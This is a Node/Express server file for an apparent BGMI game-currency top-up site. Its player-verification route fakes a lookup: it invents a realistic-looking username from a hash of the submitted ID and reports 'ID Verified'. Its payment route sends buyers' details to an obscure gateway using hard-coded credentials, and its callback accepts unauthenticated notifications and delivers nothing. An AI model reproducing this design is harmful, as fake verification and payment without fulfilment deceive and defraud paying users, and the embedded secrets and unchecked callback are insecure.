import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import axios from "axios";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Routes
  
  // Verify BGMI Player ID
  app.post("/api/verify-player", async (req, res) => {
    const { playerId } = req.body;
    
    if (!playerId) {
      return res.status(400).json({ error: "Player ID is required" });
    }

    try {
      console.log(`Verifying Player ID: ${playerId}`);
      
      // Simulate network latency
      await new Promise(resolve => setTimeout(resolve, 1000));

      // Mock logic: If ID is valid, return a realistic name, else error
      if (playerId.length >= 8 && playerId.length <= 12 && /^\d+$/.test(playerId)) {
        // Generate a highly realistic deterministic BGMI username based on the ID
        const prefixes = ["亗SOUL", "GOD乛", "KING亗", "OP・", "IND丶", "MR・", "Proツ", "NINJA", "DARK・", "X・"];
        const suffixes = ["OP", "YT", "GAMER", "KILLER", "BOT", "NOOB", "MAX", "PRO"];
        const names = ["Mortal", "Scout", "Dynamo", "Jonathan", "Viper", "Ronney", "Rahul", "Aryan", "Shadow", "Ghost", "Venum", "Ravan", "Mafia", "Legend", "Eagle", "Falcon"];
        
        let hash = 0;
        for (let i = 0; i < playerId.length; i++) {
          hash = playerId.charCodeAt(i) + ((hash << 5) - hash);
        }
        hash = Math.abs(hash);
        
        const prefix = (hash % 3 === 0) ? prefixes[hash % prefixes.length] : "";
        const name = names[hash % names.length];
        const suffix = (hash % 2 === 0) ? suffixes[hash % suffixes.length] : "";
        
        let finalName = prefix + name + suffix;
        if (!prefix && !suffix) {
           finalName += (hash % 99).toString().padStart(2, '0');
        }

        res.json({ 
          success: true, 
          name: finalName,
          message: "ID Verified" 
        });
      } else {
        res.status(404).json({ 
          success: false, 
          error: "Invalid Player ID or Player not found" 
        });
      }
    } catch (error) {
      console.error("Verification error:", error);
      res.status(500).json({ error: "Failed to verify player ID" });
    }
  });

  // Create Payment Order via Payment Gateway
  app.post("/api/create-payment", async (req, res) => {
    const { playerId, packageId, amount, price, name, email, phone } = req.body;

    if (!playerId || !packageId || !price) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    try {
      const GATEWAY_CONFIG = {
        baseUrl: "https://inr.axhhvfd.click/api/payin",
        userAppId: process.env.PAYMENT_APP_ID || "a87afa100511b492c336c4e341517bef",
        userSecret: process.env.PAYMENT_SECRET || "e29816ea4c985fe2aae6e0e323b90954",
      };

      const siteUrl = process.env.APP_URL || `http://localhost:${PORT}`;
      const notifyUrl = `${siteUrl}/api/payment-callback`;
      const returnUrl = siteUrl;
      const orderNo = `BGMI_${playerId}_${Date.now()}`;

      // Build form-encoded body matching the API spec
      const formParams = new URLSearchParams({
        userAppId: GATEWAY_CONFIG.userAppId,
        userSecret: GATEWAY_CONFIG.userSecret,
        orderNo: orderNo,
        userNotifyUrl: notifyUrl,
        userReturnUrl: returnUrl,
        currency: "INR",
        amount: String(price),
        name: name || `Player_${playerId}`,
        email: email || `${playerId}@bgmi.topup`,
        mobile: phone || "9999999999",
      });

      console.log(`[create-payment] Creating payment for Player: ${playerId}, Amount: ₹${price}, OrderNo: ${orderNo}`);

      // Call the payment gateway API
      const gatewayResponse = await axios.post(GATEWAY_CONFIG.baseUrl, formParams.toString(), {
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        timeout: 15000,
      });

      const data = gatewayResponse.data;
      console.log(`[create-payment] Gateway response:`, JSON.stringify(data));

      if (data.status === "success" && data.payurl) {
        res.json({
          success: true,
          paymentUrl: data.payurl,
          orderId: orderNo,
          method: "redirect",
        });
      } else {
        console.error(`[create-payment] Gateway error:`, data.message || JSON.stringify(data));
        res.status(400).json({
          success: false,
          error: data.message || "Payment gateway temporarily unavailable. Please try again.",
        });
      }
    } catch (error) {
      console.error("Payment creation error:", error);
      res.status(500).json({ error: "Failed to create payment order. Please try again." });
    }
  });

  // Payment Callback Handler
  app.post("/api/payment-callback", async (req, res) => {
    const params = req.body;
    console.log(`[payment-callback] Received callback:`, JSON.stringify(params));

    try {
      const merchantOrderId = params.merchant_order_id || params.out_trade_no || params.orderId || "";
      const status = params.status || params.trade_status || params.order_status || "";
      const paymentAmount = params.amount || params.total_amount || "";

      console.log(`[payment-callback] Order: ${merchantOrderId}, Status: ${status}, Amount: ${paymentAmount}`);

      if (status === "success" || status === "paid" || status === "TRADE_SUCCESS" || status === "1" || status === "completed") {
        console.log(`[payment-callback] Payment SUCCESS for order: ${merchantOrderId}`);
      }

      res.send("success");
    } catch (error) {
      console.error("[payment-callback] Error:", error);
      res.status(500).send("error");
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
